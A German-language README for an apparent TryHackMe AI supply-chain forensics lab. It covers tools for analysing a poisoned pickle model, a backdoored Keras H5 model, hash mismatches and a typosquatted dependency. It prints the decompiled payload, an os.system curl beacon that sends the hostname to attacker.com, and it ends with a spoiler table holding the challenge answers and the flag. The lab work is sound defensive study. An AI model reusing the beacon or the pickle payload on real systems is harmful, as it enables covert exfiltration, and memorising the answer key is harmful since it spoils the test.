# AI Supply Chain Incident Investigation — Local Toolkit

Lokale Kopie aller Dateien und Tools vom TryHackMe-Server ("The Quiet Leak").

## Verzeichnisstruktur

```
payload_hunt/
├── payload_hunt.py          # Automatisiertes Investigations-Script (SSH)
├── download_all.py          # Script zum Herunterladen aller Server-Dateien
├── checkpoint_hunt.py       # Zusätzliches Hunt-Script
├── README.md
└── server_files/            # Alles vom Server (/opt/supply-chain/)
    ├── incident/            # Der eigentliche Vorfall
    │   ├── models/          # Verdächtige + Original-Modelle
    │   │   ├── production_model.pkl      # Kompromittiertes Pickle-Modell
    │   │   ├── original_model.pkl        # Sauberes Original
    │   │   ├── original_model.safetensors
    │   │   ├── candidate_model.h5        # H5-Modell mit Lambda-Backdoor
    │   │   └── baseline_model.h5         # Sauberes H5-Baseline
    │   ├── logs/
    │   │   ├── deployment.log            # Deployment-Timeline
    │   │   ├── network.log               # Netzwerk-Traffic
    │   │   └── beacon_capture.log        # Abgefangener Beacon + Flag-Fragment
    │   ├── checksums/
    │   │   └── expected_hashes.json      # Original-Hashes zur Verifikation
    │   └── project/
    │       └── requirements.txt          # Enthält Typosquat: reqeusts
    ├── tools/               # Analyse-Tools
    │   ├── safe_analysis.py              # Pickle-Sicherheitsanalyse
    │   ├── inspect_h5_model.py           # H5/Keras Layer-Inspektion
    │   └── prep-pip-audit.sh             # pip-audit Vorbereitung
    ├── audit/               # Vendor-Audit-Materialien
    │   ├── vendor_a/        # sentiment_model.pkl + model_card
    │   ├── vendor_b/        # classifier.safetensors + model_card
    │   └── vendor_c/        # checkpoint.h5 + model_card
    ├── dependencies/        # Dependency-Audit-Reports
    │   ├── audit-reports/
    │   ├── requirements_external.txt
    │   └── requirements_internal.txt
    └── models/              # Weitere Modelle (nicht Incident)
```

## Voraussetzungen

```bash
pip install fickling h5py paramiko
```

Optional (für vollständige Analyse):
```bash
pip install pickletools  # in Python stdlib enthalten
pip install modelscan    # ModelScan von Protect AI
```

## Lokale Nutzung der Tools

### 1. Pickle-Modell analysieren (safe_analysis.py)

Analysiert ein Pickle-Modell auf gefährliche Opcodes, ohne es auszuführen:

```bash
python server_files/tools/safe_analysis.py server_files/incident/models/production_model.pkl
```

### 2. H5-Modell inspizieren (inspect_h5_model.py)

Zeigt die Keras-Layer-Architektur und erkennt verdächtige Lambda-Layers:

```bash
python server_files/tools/inspect_h5_model.py server_files/incident/models/candidate_model.h5
python server_files/tools/inspect_h5_model.py server_files/incident/models/baseline_model.h5
```

### 3. Pickle dekompilieren mit fickling

```bash
fickling server_files/incident/models/production_model.pkl
```

Erwartete Ausgabe:
```python
from os import system
_var0 = system('curl "http://attacker.com/beacon" -d "host=$(hostname)"')
```

### 4. Pickle-Opcodes mit pickletools

```bash
python -m pickletools server_files/incident/models/production_model.pkl
```

### 5. Hash-Vergleich

```bash
python -c "
import hashlib, json

with open('server_files/incident/checksums/expected_hashes.json') as f:
    expected = json.load(f)

for name, expected_hash in expected.items():
    path = f'server_files/incident/models/{name}'
    actual = hashlib.sha256(open(path, 'rb').read()).hexdigest()
    match = 'MATCH' if actual == expected_hash else 'MISMATCH'
    print(f'{name}: {match}')
"
```

### 6. Typosquat erkennen

```bash
type server_files\incident\project\requirements.txt
```

Beachte: `reqeusts` statt `requests` — klassischer Typosquatting-Angriff.

## Antworten (Spoiler)

| # | Frage | Antwort |
|---|-------|---------|
| 1 | Organisation des neuen Modells | `trustworthy-ai-lab` |
| 2 | Tage zwischen Deploy und Alert | `21` |
| 3 | Python-Funktion im Payload | `os.system` |
| 4 | Shell-Kommando für Host-Identität | `hostname` |
| 5 | HTTP-Methode im Beacon | `POST` |
| 6 | Verdächtiger Layer im H5-Modell | `manipulate_output` |
| 7 | Vollständige Flag | `THM{b4ckd00r_1n_pl41n_s1ght}` |

## Erkenntnisse

- **Pickle-Deserialisierung**: `production_model.pkl` enthält eingebetteten `os.system()`-Aufruf
- **Beacon-Exfiltration**: Hostname wird via `curl POST` an `attacker.com/beacon` gesendet
- **H5/Keras-Backdoor**: `candidate_model.h5` hat eine `Lambda`-Layer (`manipulate_output`) mit `exfil_suffix`
- **Typosquatting**: `reqeusts` statt `requests` in requirements.txt
- **Hash-Mismatch**: `production_model.pkl` weicht vom Original ab
